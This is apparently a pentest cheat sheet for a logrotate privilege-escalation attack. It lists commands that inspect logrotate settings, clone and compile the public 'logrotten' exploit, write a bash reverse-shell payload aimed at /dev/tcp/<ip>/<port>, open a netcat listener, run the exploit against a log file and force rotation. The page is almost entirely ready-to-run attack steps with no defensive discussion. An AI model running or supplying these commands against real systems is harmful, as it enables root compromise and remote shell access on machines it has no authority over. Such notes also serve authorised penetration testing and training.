# Logrotate

## Inspect Logrotate

```sh
logrotate --version
cat /etc/logrotate.conf
ls /etc/logrotate.d/
grep -E "create|compress" /etc/logrotate.conf | grep -v "#"
```

## Exploitation (logrotten)

```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

### Payload

```sh
echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' > payload
nc -nlvp <port>
```

### Run exploit

```sh
./logrotten -p ./payload /tmp/tmp.log
```

### Force rotation (if allowed)

```sh
sudo logrotate -f /etc/logrotate.conf
```

### Check status file

```sh
sudo cat /var/lib/logrotate.status
```
